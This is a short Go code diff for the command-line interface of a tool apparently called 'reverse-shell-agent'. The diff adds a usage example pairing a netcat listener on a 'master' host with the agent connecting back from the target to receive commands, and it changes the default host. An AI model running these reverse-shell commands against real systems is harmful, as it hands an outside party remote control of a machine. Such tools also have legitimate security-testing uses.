@@ -11,6 +11,15 @@ import (
 	"github.com/spf13/cobra"
 )
 
+const (
+	tcpListenerExample = `# On the master (1.2.3.4)
+$ nc -v -l -p 7777
+
+# On the target
+$ reverse-shell-agent tcp --host=1.2.3.4 --port=7777
+`
+)
+
 type tcpListenerOptions struct {
 	host string
 	port int32
@@ -23,12 +32,13 @@ func NewTCPListenerCommand(agent Cli) *cobra.Command {
 	cmd := &cobra.Command{
 		Use:              "tcp",
 		Short:            "Agent that connects to a remove tcp endpoints and listen for commands",
+		Example:          tcpListenerExample,
 		TraverseChildren: true,
 		Run: func(cmd *cobra.Command, args []string) {
 			agent.SafeStart(newTCPListener(opts.host, opts.port))
 		},
 	}
-	cmd.Flags().StringVarP(&opts.host, "host", "", "127.0.0.1", "remote host to connect to")
+	cmd.Flags().StringVarP(&opts.host, "host", "", "0.0.0.0", "remote host to connect to")
 	cmd.Flags().Int32VarP(&opts.port, "port", "", 8080, "remote port to connect to")
 
 	return cmd
